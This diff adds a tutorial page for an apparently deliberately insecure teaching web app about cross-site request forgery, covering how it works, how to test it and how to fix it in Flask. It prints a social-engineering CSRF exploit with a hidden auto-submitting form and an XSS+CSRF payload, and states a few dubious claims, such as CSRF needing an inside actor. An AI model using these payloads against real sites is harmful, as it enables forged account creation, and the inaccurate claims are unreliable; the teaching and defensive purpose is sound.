@@ -1,0 +1,457 @@
+---
+title: 'Cross-Site Request Forgery (CSRF)'
+description: 'Learn how to identify, test, and prevent CSRF attacks in the Normo Unsecure PWA'
+icon: 'shield-xmark'
+---
+
+## What is CSRF?
+
+Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing.
+
+<Warning>
+  If the victim is a normal user, a successful CSRF attack can force the user to perform state-changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.
+</Warning>
+
+## How CSRF Works
+
+A CSRF attack generally requires an internal threat actor to provide insight into the internal workings of the API or system, which makes it one of the more challenging cyber vulnerabilities to mitigate.
+
+The attack exploits the trust that a web application has in the user's browser. If a user is authenticated to a site, their browser automatically sends authentication cookies with every request to that site—even if the request originates from a malicious third-party site.
+
+## CSRF Attack Example in Normo Unsecure PWA
+
+The application is vulnerable to CSRF attacks because it:
+1. **Has no CSRF token protection** on forms
+2. **Accepts form submissions without origin validation**
+3. **Relies solely on session cookies for authentication**
+
+### The Attack Setup
+
+The included CSRF exploit (`/home/daytona/workspace/source/.student_resources/CSRF/index.html`) demonstrates a sophisticated phishing attack:
+
+```html CSRF Attack - Fake Email Interface
+<!DOCTYPE html>
+<head>
+    <title>Work Email</title>
+</head>
+<body>
+    <!-- Fake email interface that looks legitimate -->
+    <article class="message-pane">
+        <header class="message-info">
+            <h1>your_boss@gmail.com</h1>
+            <h2>Employee of the month prize!</h2>
+        </header>
+        <section class="message-content">
+            <h1>You won $10,000</h1>
+            <p>The whole team is so proud of you, click below to claim your prize</p>
+            
+            <!-- Hidden malicious form -->
+            <form hidden id="hack" target="csrf-frame" action="" method="POST" autocomplete="off">
+                <input id="username" name="username" value="give_me_access">
+                <input name="password" value="abc123">
+                <input name="dob" value="01/01/2001">
+            </form>
+            <iframe hidden name="csrf-frame"></iframe>
+            
+            <!-- Innocent-looking button -->
+            <button onClick="hack();" id="button">Click to claim</button>
+        </section>
+    </article>
+</body>
+```
+
+### The Attack JavaScript
+
+```javascript CSRF Attack Script
+function hack() {
+    // Detect the correct Flask app URL
+    let baseUrl = '';
+    
+    if (window.location.hostname.includes('app.github.dev')) {
+        // Codespaces environment
+        baseUrl = window.location.protocol + '//' + 
+                  window.location.hostname.replace('-5500', '-5000');
+    } else if (window.location.hostname.includes('github.dev')) {
+        // Other Codespaces formats
+        baseUrl = window.location.protocol + '//' + 
+                  window.location.hostname.replace('5500', '5000');
+    } else {
+        // Local environment
+        baseUrl = 'http://localhost:5000';
+    }
+    
+    // Set the form action to the vulnerable endpoint
+    document.getElementById("hack").action = baseUrl + '/signup.html';
+    
+    // Generate a random username
+    let username = "Hacker_" + 
+                   Math.random().toString(36).substring(2, 4) + 
+                   Math.random().toString(36).substring(2, 4);
+    document.getElementById("username").value = username;
+    
+    // Submit the malicious form
+    document.getElementById("hack").submit();
+    
+    // Display success message to attacker
+    document.getElementById("warning").innerHTML = 
+        "<p>HA HA HA! You have been hacked!</p>" +
+        "<p>Check your user database, we can log in with: " + username + "</p>" +
+        "<p>Target URL: " + baseUrl + "/signup.html</p>";
+}
+```
+
+<Info>
+  Notice how the attack automatically detects the environment (Codespaces vs. local) and adjusts the target URL accordingly. This makes the attack highly portable.
+</Info>
+
+## How to Test for CSRF
+
+<Steps>
+  <Step title="Create a Malicious Webpage">
+    Create a simple webpage with a duplicate form that declares the `value` attribute for each form input. The example in `.student_resources/CSRF/index.html` is set up as a whale or spear phishing attack targeting a victim with administration-level authorization.
+  </Step>
+
+  <Step title="Host the Attack Page">
+    Host the malicious page on a different origin (different domain or port):
+    ```bash
+    # In the CSRF directory, start a simple web server
+    python3 -m http.server 5500
+    ```
+    
+    This simulates hosting the attack on a different domain.
+  </Step>
+
+  <Step title="Ensure Target is Authenticated">
+    The victim must have an active session on the target application. Log in to the Normo Unsecure PWA before testing.
+  </Step>
+
+  <Step title="Execute the Attack">
+    Open the malicious page (e.g., `http://localhost:5500/index.html`) and click the "Click to claim" button.
+  </Step>
+
+  <Step title="Verify Success">
+    **White-box testing:** Check the database logs and users table to see if the user was added.
+    
+    **Black-box testing:** Try logging in with the credentials shown in the attack confirmation message.
+  </Step>
+</Steps>
+
+## Vulnerable Endpoints
+
+The following endpoints in Normo Unsecure PWA are vulnerable to CSRF:
+
+<Accordion title="/signup.html - User Registration">
+  **Vulnerability:** Accepts POST requests without CSRF token validation.
+  
+  **Impact:** Attackers can create unauthorized user accounts, including admin accounts if the attacker knows the required parameters.
+  
+  **Attack Vector:**
+  ```html
+  <form action="http://target-app.com/signup.html" method="POST">
+    <input name="username" value="attacker_admin">
+    <input name="password" value="password123">
+    <input name="dob" value="01/01/2000">
+  </form>
+  <script>document.forms[0].submit();</script>
+  ```
+</Accordion>
+
+<Accordion title="/feedback.html - Feedback Submission">
+  **Vulnerability:** Accepts feedback without CSRF protection.
+  
+  **Impact:** Attackers can submit fake feedback or inject malicious content (combined XSS+CSRF attack).
+  
+  **Attack Vector:**
+  ```html
+  <form action="http://target-app.com/feedback.html" method="POST">
+    <input name="feedback" value="<script>alert('XSS+CSRF');</script>">
+  </form>
+  <script>document.forms[0].submit();</script>
+  ```
+</Accordion>
+
+<Accordion title="Any State-Changing Operation">
+  **Vulnerability:** No forms use CSRF tokens.
+  
+  **Impact:** Any authenticated action can be forced on a victim.
+</Accordion>
+
+## How to Fix CSRF Vulnerabilities
+
+<Info>
+  The key to preventing CSRF is implementing the **Synchronizer Token Pattern (STP)**, where a secret and unique value for each request is embedded in forms and verified on the server side.
+</Info>
+
+### Implementation with Flask-WTF
+
+The best solution is to use Flask-WTF, which automatically implements CSRF protection:
+
+<CodeGroup>
+
+```python Install Flask-WTF
+# Install the package
+pip install Flask-WTF
+```
+
+```python Configure Flask App
+from flask import Flask
+from flask_wtf.csrf import CSRFProtect
+
+app = Flask(__name__)
+# Set a secret key for CSRF token generation
+app.config['SECRET_KEY'] = 'your-secret-key-here-change-in-production'
+
+# Enable CSRF protection globally
+csrf = CSRFProtect(app)
+```
+
+```html Update Form Templates
+<!-- Add CSRF token to all forms -->
+<form action="/signup.html" method="post">
+  <!-- This generates a hidden input with the CSRF token -->
+  {{ csrf_token() }}
+  
+  <input type="text" name="username" placeholder="Username" required />
+  <input type="password" name="password" placeholder="Password" required />
+  <input type="text" name="dob" placeholder="Date of Birth" required />
+  <input type="submit" value="Sign Up" />
+</form>
+```
+
+```python Validate Token in Route
+from flask import request, render_template
+from flask_wtf.csrf import validate_csrf
+from wtforms import ValidationError
+
+@app.route('/signup.html', methods=['GET', 'POST'])
+def signup():
+    if request.method == 'POST':
+        try:
+            # Flask-WTF automatically validates CSRF token
+            # if CSRFProtect is enabled
+            username = request.form['username']
+            password = request.form['password']
+            dob = request.form['dob']
+            
+            # Process the form...
+            insertUser(username, password, dob)
+            return "User created successfully"
+        except ValidationError:
+            return "CSRF token validation failed", 403
+    
+    return render_template('signup.html')
+```
+
+</CodeGroup>
+
+### Manual CSRF Token Implementation
+
+If you can't use Flask-WTF, implement CSRF protection manually:
+
+<CodeGroup>
+
+```python Generate CSRF Token
+import secrets
+from flask import session
+
+def generate_csrf_token():
+    if 'csrf_token' not in session:
+        session['csrf_token'] = secrets.token_hex(32)
+    return session['csrf_token']
+
+# Make token available to templates
+app.jinja_env.globals['csrf_token'] = generate_csrf_token
+```
+
+```python Validate CSRF Token
+from flask import request, session, abort
+
+def validate_csrf_token():
+    token = session.get('csrf_token', None)
+    if not token or token != request.form.get('csrf_token'):
+        abort(403)  # Forbidden
+
+@app.route('/signup.html', methods=['POST'])
+def signup():
+    validate_csrf_token()  # Check token before processing
+    
+    username = request.form['username']
+    password = request.form['password']
+    dob = request.form['dob']
+    
+    insertUser(username, password, dob)
+    return "User created successfully"
+```
+
+```html Include Token in Forms
+<form action="/signup.html" method="post">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
+  
+  <input type="text" name="username" placeholder="Username" required />
+  <input type="password" name="password" placeholder="Password" required />
+  <input type="text" name="dob" placeholder="Date of Birth" required />
+  <input type="submit" value="Sign Up" />
+</form>
+```
+
+</CodeGroup>
+
+## Comprehensive Countermeasures
+
+<Steps>
+  <Step title="Implement Synchronizer Token Pattern">
+    Use Flask-WTF or implement CSRF tokens manually. This is the **most effective** defense against CSRF attacks.
+    
+    The token should be:
+    - Unpredictable (cryptographically random)
+    - Unique per session
+    - Validated on every state-changing request
+  </Step>
+
+  <Step title="Implement Content Security Policy">
+    Add a CSP header to restrict what sources can be loaded:
+    ```python
+    @app.after_request
+    def set_security_headers(response):
+        response.headers['Content-Security-Policy'] = "default-src 'self'"
+        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+        return response
+    ```
+  </Step>
+
+  <Step title="Check Origin and Referer Headers">
+    Validate that requests come from your own domain:
+    ```python
+    from flask import request
+    from urllib.parse import urlparse
+    
+    def validate_origin():
+        origin = request.headers.get('Origin')
+        referer = request.headers.get('Referer')
+        
+        allowed_origins = ['http://localhost:5000', 'https://yourdomain.com']
+        
+        if origin and origin not in allowed_origins:
+            abort(403)
+        if referer:
+            referer_origin = urlparse(referer).netloc
+            if referer_origin not in [urlparse(o).netloc for o in allowed_origins]:
+                abort(403)
+    ```
+  </Step>
+
+  <Step title="Use SameSite Cookie Attribute">
+    Configure session cookies with SameSite attribute:
+    ```python
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # or 'Strict'
+    app.config['SESSION_COOKIE_SECURE'] = True  # Only send over HTTPS
+    app.config['SESSION_COOKIE_HTTPONLY'] = True  # Prevent JavaScript access
+    ```
+    
+    - `Strict`: Cookie only sent for same-site requests
+    - `Lax`: Cookie sent for same-site and top-level navigation
+  </Step>
+
+  <Step title="Implement Three-Factor Authentication for Admin Actions">
+    Require additional authentication for sensitive operations:
+    ```python
+    @app.route('/admin/delete-user', methods=['POST'])
+    def delete_user():
+        # Require re-authentication
+        if not verify_admin_password(request.form['admin_password']):
+            return "Authentication required", 403
+        
+        # Require TOTP code
+        if not verify_totp(request.form['totp_code']):
+            return "Invalid 2FA code", 403
+        
+        # Process deletion...
+    ```
+  </Step>
+
+  <Step title="End-User Education">
+    Train users to:
+    - Be suspicious of unsolicited emails with links
+    - Verify URLs before clicking
+    - Log out after using sensitive applications
+    - Not click links in emails claiming urgent action
+  </Step>
+
+  <Step title="Code Review with Specific Scenarios">
+    Understand how CSRF can be executed in your specific application context:
+    - Map all state-changing endpoints
+    - Identify which require authentication
+    - Ensure all have CSRF protection
+    - Test with actual attack scenarios
+  </Step>
+
+  <Step title="Implement Firewall Policies">
+    Use IP whitelisting for administrative functions:
+    ```python
+    ADMIN_IPS = ['192.168.1.100', '10.0.0.50']
+    
+    @app.route('/admin/*')
+    def admin_area():
+        if request.remote_addr not in ADMIN_IPS:
+            abort(403)
+        # Process admin request...
+    ```
+  </Step>
+</Steps>
+
+## Testing Checklist
+
+<Accordion title="Endpoints to Test">
+  Test CSRF protection on all state-changing operations:
+  - ✅ User registration
+  - ✅ Login (less critical, but good practice)
+  - ✅ Password change
+  - ✅ Email change
+  - ✅ Profile updates
+  - ✅ Content submission (feedback, comments)
+  - ✅ Administrative actions
+  - ✅ Financial transactions
+  - ✅ Account deletion
+</Accordion>
+
+<Accordion title="Attack Scenarios to Test">
+  1. **Basic CSRF**: Hidden form auto-submits on page load
+  2. **XSS + CSRF**: Use XSS to extract CSRF token
+  3. **Subdomain attack**: Attack from subdomain if SameSite=Lax
+  4. **CORS misconfiguration**: Exploit permissive CORS policies
+</Accordion>
+
+## Real-World Impact
+
+<Warning>
+  CSRF attacks have been used to:
+  - Transfer funds from bank accounts
+  - Change email addresses to lock users out
+  - Create admin accounts in web applications
+  - Modify firewall rules
+  - Post spam or malicious content
+  - Change router DNS settings
+</Warning>
+
+## File Locations
+
+<ParamField path=".student_resources/CSRF/index.html" type="file">
+  **Lines 88-94**: Hidden malicious form that exploits CSRF vulnerability
+  
+  **Lines 98-128**: JavaScript that detects environment and submits the attack
+  
+  This file serves as a complete CSRF exploit demonstration, showing how attackers combine social engineering (fake email interface) with technical exploitation.
+</ParamField>
+
+<ParamField path="app.py" type="file">
+  All POST endpoints lack CSRF protection:
+  - `/signup.html` - Vulnerable to account creation
+  - `/feedback.html` - Vulnerable to content injection
+  - `/` (login) - Vulnerable to session fixation
+</ParamField>
+
+## References
+
+<Card title="Flask-WTF Documentation" icon="book" href="https://flask-wtf.readthedocs.io/en/1.2.x/">
+  Official documentation for implementing CSRF protection in Flask applications using the Synchronizer Token Pattern
+</Card>
